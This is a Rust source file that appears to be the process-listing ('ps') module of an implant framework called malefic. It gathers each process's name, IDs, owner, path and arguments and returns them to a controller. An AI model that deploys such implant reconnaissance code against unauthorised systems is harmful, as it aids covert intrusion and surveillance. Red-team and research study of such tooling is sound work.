use crate::{Module, TaskResult, check_request, Result};
use malefic_helper::protobuf::implantpb::{spite::Body, self, PsResponse};
use async_trait::async_trait;
use malefic_trait::module_impl;

pub struct Ps {}

#[async_trait]
#[module_impl("ps")]
impl Module for Ps {
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _sender: &mut crate::Output) -> Result {
        let _ = check_request!(receiver, Body::Request)?;

        // let pid = check_field!(request.input)?;
        let mut response = PsResponse::default();
        for (_, process) in malefic_helper::common::process::get_processes()?.into_iter(){
            response.processes.push(implantpb::Process{
                name: process.name,
                pid: process.pid,
                ppid: process.ppid,
                arch: process.arch,
                owner: process.owner,
                path: process.path,
                args: process.args,
            });
        }

        Ok(TaskResult::new_with_body(id, Body::PsResponse(response))) // 响应体为空
    }
}